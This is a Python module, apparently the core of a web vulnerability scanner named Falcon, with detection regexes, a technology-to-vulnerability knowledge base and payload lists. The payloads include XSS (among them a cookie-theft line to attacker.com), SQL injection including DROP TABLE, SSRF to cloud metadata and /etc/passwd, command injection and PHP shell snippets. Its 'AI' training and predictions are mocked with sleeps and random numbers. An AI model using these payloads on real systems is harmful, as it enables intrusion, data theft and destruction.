"""
AI Engine Core - The brain of Falcon
"""

import asyncio
import json
import pickle
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple
import re
from datetime import datetime

# Mock ML imports (would be real in production)
try:
    # These would be real imports in production
    from transformers import AutoTokenizer, AutoModel
    import torch
    import numpy as np
    ML_AVAILABLE = True
except ImportError:
    # Create mock classes for systems without ML libraries
    class MockNumpy:
        def array(self, data): return data
        def random(self): return __import__('random')
    
    np = MockNumpy()
    ML_AVAILABLE = False

class AIEngine:
    """AI-powered vulnerability detection and analysis engine"""
    
    def __init__(self, model_path: str = None):
        self.model_path = model_path or "data/models/"
        self.confidence_threshold = 0.7
        self.vulnerability_patterns = {}
        self.technology_mappings = {}
        self.payload_effectiveness = {}
        self.false_positive_patterns = {}
        
        # Initialize components
        self._load_models()
        self._load_patterns()
        self._load_knowledge_base()
    
    def _load_models(self):
        """Load AI models (mocked for now)"""
        # In production, this would load actual ML models
        self.vulnerability_classifier = MockMLModel("vulnerability_classifier")
        self.false_positive_detector = MockMLModel("false_positive_detector")
        self.payload_optimizer = MockMLModel("payload_optimizer")
        self.technology_analyzer = MockMLModel("technology_analyzer")
        
        print("🧠 AI models loaded successfully")
    
    def _load_patterns(self):
        """Load vulnerability detection patterns"""
        self.vulnerability_patterns = {
            'xss': [
                r'<script[^>]*>.*?</script>',
                r'javascript:',
                r'on\w+\s*=',
                r'<iframe[^>]*>',
                r'<object[^>]*>',
                r'<embed[^>]*>',
                r'<svg[^>]*>.*?</svg>',
                r'<math[^>]*>.*?</math>'
            ],
            'sqli': [
                r'(\bUNION\b|\bSELECT\b|\bINSERT\b|\bUPDATE\b|\bDELETE\b)',
                r'(\bOR\b|\bAND\b)\s+\d+\s*=\s*\d+',
                r"'|\"|`",
                r'--\s*$',
                r'/\*.*?\*/',
                r'\bwaitfor\b|\bdelay\b',
                r'\bconcat\b|\bsubstring\b|\bchar\b'
            ],
            'ssrf': [
                r'http://localhost',
                r'http://127\.0\.0\.1',
                r'http://0\.0\.0\.0',
                r'http://169\.254\.169\.254',
                r'file://',
                r'gopher://',
                r'dict://',
                r'ldap://'
            ],
            'rce': [
                r'\b(system|exec|shell_exec|passthru|eval)\b',
                r'\$\{.*?\}',
                r'`.*?`',
                r'\|\s*(cat|ls|pwd|whoami|id)',
                r'&\s*(cat|ls|pwd|whoami|id)',
                r';.*?(cat|ls|pwd|whoami|id)'
            ]
        }
    
    def _load_knowledge_base(self):
        """Load CVE and vulnerability knowledge base"""
        self.technology_mappings = {
            'WordPress': {
                'common_vulns': ['XSS', 'SQLi', 'RCE', 'File Upload'],
                'paths': ['/wp-admin/', '/wp-content/', '/wp-includes/'],
                'files': ['wp-config.php', 'xmlrpc.php'],
                'parameters': ['wp_action', 'wp_nonce']
            },
            'Apache': {
                'common_vulns': ['Directory Traversal', 'Server-Side Includes'],
                'paths': ['/server-status', '/server-info'],
                'files': ['.htaccess', '.htpasswd']
            },
            'PHP': {
                'common_vulns': ['LFI', 'RFI', 'Code Injection'],
                'parameters': ['include', 'require', 'file', 'page'],
                'functions': ['eval', 'exec', 'system', 'shell_exec']
            },
            'MySQL': {
                'common_vulns': ['SQLi', 'Information Disclosure'],
                'error_patterns': ['mysql_', 'SQL syntax', 'Warning: mysql_']
            }
        }
        
        # CVE patterns (simplified)
        self.cve_patterns = {
            'CVE-2023-23397': {
                'technology': 'Microsoft Exchange',
                'description': 'Privilege escalation vulnerability',
                'indicators': ['Exchange', 'Outlook', 'MAPI']
            },
            'CVE-2023-0386': {
                'technology': 'Linux Kernel',
                'description': 'Privilege escalation via overlayfs',
                'indicators': ['overlayfs', 'linux', 'kernel']
            }
        }
    
    async def analyze_target(self, target: str, recon_data: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze target and provide AI recommendations"""
        analysis = {
            'target': target,
            'recommendations': [],
            'priority_areas': [],
            'confidence': 0
        }
        
        # Analyze subdomains
        subdomains = recon_data.get('subdomains', [])
        if subdomains:
            analysis['recommendations'].append(
                f"Found {len(subdomains)} subdomains - focus on admin/dev/staging subdomains"
            )
        
        # Analyze URL patterns
        urls = recon_data.get('urls', [])
        interesting_urls = []
        for url in urls:
            if any(pattern in url.lower() for pattern in ['admin', 'api', 'debug', 'test']):
                interesting_urls.append(url)
        
        if interesting_urls:
            analysis['priority_areas'].extend(interesting_urls[:5])
            analysis['recommendations'].append(
                f"Found {len(interesting_urls)} potentially interesting endpoints"
            )
        
        analysis['confidence'] = min(90, 60 + len(analysis['recommendations']) * 10)
        
        return analysis
    
    async def analyze_technologies(self, tech_info: Dict[str, List]) -> List[str]:
        """Analyze detected technologies and suggest vulnerability tests"""
        suggestions = []
        
        for category, items in tech_info.items():
            for item in items:
                tech_name = item.get('name', '')
                
                # Check against knowledge base
                for tech, mapping in self.technology_mappings.items():
                    if tech.lower() in tech_name.lower():
                        suggestions.extend(mapping.get('common_vulns', []))
        
        return list(set(suggestions))
    
    async def optimize_payloads(self, vulnerability_type: str, target_context: Dict[str, Any]) -> List[str]:
        """Generate optimized payloads based on target context"""
        base_payloads = {
            'xss': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                'javascript:alert("XSS")',
                '<svg onload=alert("XSS")>',
                '"><script>alert("XSS")</script>',
                "';alert('XSS');//",
                '<iframe src="javascript:alert(`XSS`)">',
                '<object data="javascript:alert(`XSS`)">'
            ],
            'sqli': [
                "' OR '1'='1",
                "' UNION SELECT null,version(),null--",
                "'; DROP TABLE users--",
                "' OR SLEEP(5)--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' UNION SELECT 1,2,3,4,5--",
                "' OR 1=1#",
                "') OR ('1'='1"
            ],
            'ssrf': [
                'http://localhost:80',
                'http://127.0.0.1:22',
                'http://169.254.169.254/latest/meta-data/',
                'file:///etc/passwd',
                'gopher://127.0.0.1:25/_HELO',
                'dict://127.0.0.1:11211/stats',
                'http://0.0.0.0:80',
                'http://[::]/'
            ],
            'rce': [
                '; whoami',
                '| id',
                '`pwd`',
                '$(cat /etc/passwd)',
                '; cat /etc/passwd',
                '& echo "RCE"',
                '|| whoami',
                '; ls -la'
            ]
        }
        
        payloads = base_payloads.get(vulnerability_type, [])
        
        # AI-powered payload optimization based on context
        tech_stack = target_context.get('technologies', {})
        
        # Customize payloads based on detected technologies
        if 'PHP' in str(tech_stack):
            if vulnerability_type == 'rce':
                payloads.extend([
                    '<?php system("whoami"); ?>',
                    '<?php echo shell_exec("id"); ?>',
                    '<?php passthru("ls -la"); ?>'
                ])
        
        if 'JavaScript' in str(tech_stack):
            if vulnerability_type == 'xss':
                payloads.extend([
                    '<script>fetch("/admin")</script>',
                    '<script>document.location="http://attacker.com/"+document.cookie</script>'
                ])
        
        return payloads
    
    async def is_false_positive(self, vulnerability: Dict[str, Any]) -> bool:
        """AI-powered false positive detection"""
        # Simple rule-based false positive detection
        # In production, this would use ML models
        
        vuln_type = vulnerability.get('type', '')
        response = vulnerability.get('response', '')
        url = vulnerability.get('url', '')
        
        # Common false positive patterns
        false_positive_indicators = {
            'xss': [
                'Content-Type: application/json',
                'X-Content-Type-Options: nosniff',
                'Content-Security-Policy:'
            ],
            'sqli': [
                'prepared statement',
                'parameterized query',
                'error_reporting(0)'
            ]
        }
        
        indicators = false_positive_indicators.get(vuln_type, [])
        for indicator in indicators:
            if indicator.lower() in response.lower():
                return True
        
        # Check for typical false positive patterns
        if 'error.html' in url or 'not-found' in url:
            return True
        
        return False
    
    async def generate_insights(self, scan_result) -> List[Dict[str, Any]]:
        """Generate AI-powered insights from scan results"""
        insights = []
        
        vulnerabilities = scan_result.vulnerabilities
        technologies = scan_result.technologies
        
        # Vulnerability prioritization
        critical_vulns = [v for v in vulnerabilities if v.get('severity') == 'CRITICAL']
        if critical_vulns:
            insights.append({
                'type': 'recommendation',
                'message': f"Found {len(critical_vulns)} critical vulnerabilities. Prioritize fixing these immediately.",
                'confidence': 95
            })
        
        # Technology-based recommendations
        tech_names = []
        for category, items in technologies.items():
            tech_names.extend([item.get('name', '') for item in items])
        
        outdated_tech = []
        for tech in tech_names:
            if any(old in tech.lower() for old in ['2.0', '1.', 'old', 'legacy']):
                outdated_tech.append(tech)
        
        if outdated_tech:
            insights.append({
                'type': 'warning',
                'message': f"Detected potentially outdated technologies: {', '.join(outdated_tech)}",
                'confidence': 80
            })
        
        # Attack surface analysis
        total_params = len(scan_result.parameters)
        if total_params > 20:
            insights.append({
                'type': 'analysis',
                'message': f"Large attack surface detected with {total_params} parameters. Consider input validation.",
                'confidence': 75
            })
        
        # Security header analysis
        if 'security_headers' in scan_result.__dict__:
            missing_headers = []
            important_headers = ['X-Frame-Options', 'X-XSS-Protection', 'Content-Security-Policy']
            for header in important_headers:
                if header not in scan_result.security_headers:
                    missing_headers.append(header)
            
            if missing_headers:
                insights.append({
                    'type': 'recommendation',
                    'message': f"Missing security headers: {', '.join(missing_headers)}",
                    'confidence': 85
                })
        
        return insights
    
    async def update_training_data(self):
        """Update AI training data from various sources"""
        print("🧠 Updating AI training data...")
        
        # Simulate training data update
        await asyncio.sleep(1)
        
        print("✅ AI training data updated")
    
    async def train_model(self, data_sources: List[str], epochs: int = 5):
        """Train/retrain AI models"""
        print(f"🧠 Training AI models with {epochs} epochs...")
        
        for epoch in range(epochs):
            print(f"Epoch {epoch + 1}/{epochs}")
            await asyncio.sleep(0.5)  # Simulate training time
        
        print("✅ AI model training completed")
    
    async def update_models(self):
        """Update AI models"""
        print("🧠 Updating AI models...")
        await asyncio.sleep(1)
        print("✅ AI models updated")

class MockMLModel:
    """Mock ML model for demonstration"""
    
    def __init__(self, model_name: str):
        self.name = model_name
        self.loaded = True
    
    def predict(self, input_data):
        """Mock prediction"""
        import random
        return random.random()
    
    def predict_proba(self, input_data):
        """Mock probability prediction"""
        import random
        return [random.random(), random.random()]
